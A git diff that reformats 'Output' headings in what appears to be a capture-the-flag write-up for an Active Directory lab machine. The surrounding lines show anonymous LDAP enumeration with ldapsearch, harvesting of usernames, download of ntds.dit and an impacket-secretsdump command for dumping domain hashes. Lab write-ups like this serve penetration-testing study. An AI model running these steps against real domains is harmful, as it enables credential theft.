@@ -207,7 +207,7 @@ Anonymous ldap acecss
 ldapsearch -x -H ldap://10.10.65.1:389/ -s base namingcontexts
 ```
 
-Output
+- Output
 ```
 [REDACTED]
 namingcontexts: DC=baby,DC=vl
@@ -222,7 +222,7 @@ namingcontexts: DC=ForestDnsZones,DC=baby,DC=vl
 ldapsearch -x -b "dc=baby,dc=vl" -H ldap://10.10.65.1
 ```
 
-Output
+- Output
 ```
 # extended LDIF
 #
@@ -1033,7 +1033,7 @@ cat ldap|grep dn:| awk -F 'CN=' '{print $2}'|awk -F ',' '{print $1}' >users.txt
 ```
 
 Note that from samaccount we got that users do have format of firstname.lastname
-Output
+- Output
 ```
 dev
 Jacqueline.Barnett
@@ -1178,7 +1178,7 @@ download ntds.dit
 impacket-secretsdump -system system -ntds ntds.dit LOCAL
 ```
 
-Output
+- Output
 ```
 └─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
